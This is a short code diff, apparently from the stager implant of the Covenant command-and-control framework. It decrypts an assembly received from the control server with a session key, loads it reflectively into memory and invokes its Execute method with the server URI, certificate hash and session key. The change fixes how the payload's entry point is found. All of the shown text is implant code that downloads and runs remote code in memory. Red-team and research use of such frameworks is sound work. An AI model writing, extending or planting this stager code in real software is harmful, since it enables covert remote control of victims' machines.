@@ -203,7 +203,9 @@ namespace GruntStager
                 SessionKey.IV = Convert.FromBase64String(iv64str);
                 byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
-                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
+                Type t = gruntAssembly.GetType("GruntExecutor.Grunt");
+                MethodInfo m = t.GetMethod("Execute");
+                m.Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
         }
